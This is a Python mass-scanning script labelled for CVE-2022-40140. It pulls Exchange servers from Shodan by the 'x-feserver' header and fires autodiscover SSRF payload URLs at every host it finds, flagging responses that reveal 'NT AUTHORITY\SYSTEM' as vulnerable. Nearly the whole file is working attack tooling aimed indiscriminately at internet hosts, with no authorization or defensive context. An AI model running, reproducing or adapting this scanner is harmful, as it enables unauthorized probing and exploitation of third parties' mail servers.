
'''
 /$$                     /$$
|__/                    | $$
 /$$  /$$$$$$   /$$$$$$$| $$$$$$$   /$$$$$$  /$$   /$$ /$$$$$$$   /$$$$$$
| $$ /$$__  $$ /$$_____/| $$__  $$ /$$__  $$| $$  | $$| $$__  $$ /$$__  $$
| $$| $$  \ $$|  $$$$$$ | $$  \ $$| $$  \__/| $$  | $$| $$  \ $$| $$  \ $$
| $$| $$  | $$ \____  $$| $$  | $$| $$      | $$  | $$| $$  | $$| $$  | $$
| $$| $$$$$$$/ /$$$$$$$/| $$$$$$$/| $$      |  $$$$$$/| $$  | $$|  $$$$$$/
|__/| $$____/ |_______/ |_______/ |__/       \______/ |__/  |__/ \______/
    | $$
    | $$
    |__/

CVE-2022-40140 MASS SCANNER
'''


import grequests
import requests
from shodan import Shodan
import uuid
import logging
import urllib3
import urllib
import time
import argparse
from urllib.parse import urlsplit, urlunsplit




api = Shodan('YOUR SHODAN API KEY')

payload1 = "/autodiscover/autodiscover.json?a@foo.var/owa/?&Email=autodiscover/autodiscover.json?a@foo.var&Protocol=XYZ&FooProtocol=Powershell"
payload2 = "/autodiscover/autodiscover.json?a@secweb.intranetapi.app//mapi/emsmdb?&Email=autodiscover/autodiscover.json?a@secweb.intranetapi.app&Protocol=XYZ&FooProtocol=Powershell"
payload3 = "/autodiscover/autodiscover.json?a@secweb.intranetapi.app//mapi/emsmdb?&Email=autodiscover/autodiscover.json?a@secweb.intranetapi.app&Protocol=Powershell"
dork ="x-feserver"

repeated= []


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def do_something(r):
    if r != None and 'x-feserver' in r.headers and (r.status_code not in [400,401,402,403,404]) and 'NT AUTHORITY\SYSTEM' in r.text:
        print(r.url,' VULNERABLE')

def base_url(url, with_path=False):
    parsed = urllib.parse.urlparse(url)
    path   = '/'.join(parsed.path.split('/')[:-1]) if with_path else ''
    parsed = parsed._replace(path=path)
    parsed = parsed._replace(params='')
    parsed = parsed._replace(query='')
    parsed = parsed._replace(fragment='')
    return parsed.geturl()

def main():

    start = 1
    end = 100
    while start < end:
        results = api.search(dork,page=start)
        urls = []
        print('Pagina ', start)
        for banner in results["matches"]:
            if 'hostnames' in banner:
                for hostname in banner["hostnames"]:
                    if hostname in repeated:
                        continue
                    hostname = (base_url('http://'+hostname)).split("http://")[1]
                    repeated.append(hostname)
                    urls.append('http://'+hostname)
                    urls.append('https://'+hostname)
                    urls.append('http://'+hostname+':'+str(banner["port"]))
                    urls.append('https://'+hostname+':'+str(banner["port"]))

        rs = (grequests.get(u+payload3,allow_redirects=False, timeout=2, verify = 'https' in u) for u in urls)
        results = grequests.map(rs)
        for result in results:
            do_something(result)
        start += 1

if __name__ == '__main__':
    main()
